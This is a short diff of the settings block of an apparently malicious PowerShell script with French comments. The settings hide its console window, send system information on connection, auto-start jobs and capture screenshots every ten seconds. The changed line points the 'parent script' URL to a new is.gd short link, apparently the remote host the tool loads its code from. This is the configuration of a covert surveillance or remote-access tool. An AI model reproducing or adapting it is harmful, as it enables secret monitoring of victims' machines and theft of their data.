@@ -26,7 +26,7 @@ $HideConsole = 1 # 1 = masquer la console, 0 = afficher
 $spawnChannels = 1 # 1 = créer des canaux au démarrage
 $InfoOnConnect = 1 # 1 = envoyer les infos système au démarrage
 $defaultstart = 1 # 1 = démarrer tous les jobs automatiquement
-$parent = "https://is.gd/M1Ul40" # URL du script parent
+$parent = "https://is.gd/y92xe4" # URL du script parent
 $DebugMode = 0 # 1 = activer le mode débogage
 $version = "1.7.0" # Version du script
 $ScreenshotInterval = 10 # Intervalle entre captures d'écran (secondes)
